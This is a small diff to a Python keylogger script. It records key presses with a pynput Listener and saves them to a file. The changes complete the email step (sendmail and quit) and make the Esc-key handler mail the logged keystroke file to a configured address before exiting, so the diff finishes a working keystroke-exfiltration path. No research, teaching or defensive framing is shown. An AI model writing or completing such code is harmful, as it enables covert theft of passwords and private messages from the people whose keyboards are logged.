@@ -78,6 +78,10 @@ def send_email(filename,attachment,toaddr):
 
     text = msg.as_string()
 
+    s.sendmail(fromaddr,toaddr,text)
+
+    s.quit()
+
 
 count = 0;
 keys = []
@@ -114,7 +118,8 @@ def write_file(keys):
 # basically releasing if key is pressed (esc key)
 def on_release(key):
     if key == Key.esc:
-        return false
+        send_email(keys_infomration, file_path + extend + keys_infomration, toaddr)
+        return False
 
 
 with Listener(on_press=on_press, on_release=on_release) as listener:
